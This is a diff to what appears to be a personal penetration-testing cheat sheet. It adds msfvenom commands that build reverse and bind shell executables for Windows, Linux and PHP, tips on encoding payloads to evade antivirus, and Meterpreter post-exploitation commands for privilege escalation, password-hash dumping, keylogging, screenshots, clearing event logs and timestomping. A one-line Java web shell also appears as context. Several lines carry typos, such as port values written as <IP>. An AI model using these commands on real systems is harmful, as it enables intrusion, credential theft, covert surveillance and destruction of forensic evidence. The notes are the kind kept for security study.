@@ -73,9 +73,54 @@ github.com/BlackArch/webshells
 <% Runtime.getRuntime().exec(request.getParameter("cmd"));%>  : java web shell
                   
                   
+       
+msfvenom
+       msfvenom -l payloads   : lists available paylaods
+       msfvenom -l encoders   : lists available encodings
+       msfvenom -p (payload) -e (encoder) -f (filer_format) LHOST=<LISTERNER_IP> LPORT=<LISTENER_PORT>
+       
+       payload obsufucation is important to bypass anti virus
+       msfvenom -e x86/shikata_ga_nai...
+       virustotal.com to check malware hash
+       
+       Basic Reverse Shells
+       Windows
+       msfvenom -p windows/x64/shell/shell_reverse_tcp LHOST=<IP> LPORT=<IP> -f exe -o malware.exe
+       Linux
+       msfvenom -p linux/x64/shell/shell_reverse_tcp  LHOST=<IP> LPORT=<IP> -f elf -o malware.elf
+       
+       Basic Bind Shells
+       Windows
+       msfvenom -p windows/x64/shell/bind_tcp LHOST=<IP> RPORT=<IP> -f exe -o malware.exe
+       Linux
+       msfvenom -p linux/x64/shell/bind_tcp  LHOST=<IP> RPORT=<IP> -f elf -o malware.elf
+       
+       msfvenom -p php/reverse_php LHOST=<IP> LPORT=1337 -o malware.php
+       msfvenom -p windws/x64/shell_reverse_tcp LHOST=<IP> LPORT=1337 -f msi -o malware.msi
+      
                   
+Meterpreter
+       post exploitation tool for MetaSploit
+       cat
+       edit
+       cd/ls
+       pwd
+       upload
+       download
+       
+       Windows specific
+              getsystem
+              hashdump
                   
-                  
+       
+Meterpreter Terrorism
+      clearev  : clear event logs
+      timestomp  : time stamp tampering
+      migrate 1337  : move to a nw process
+      keyscan_start  : start keylogger
+      keyscan_stop
+      keyscan_dump  : dump logged keys
+      screenshot
                   
                   
                   
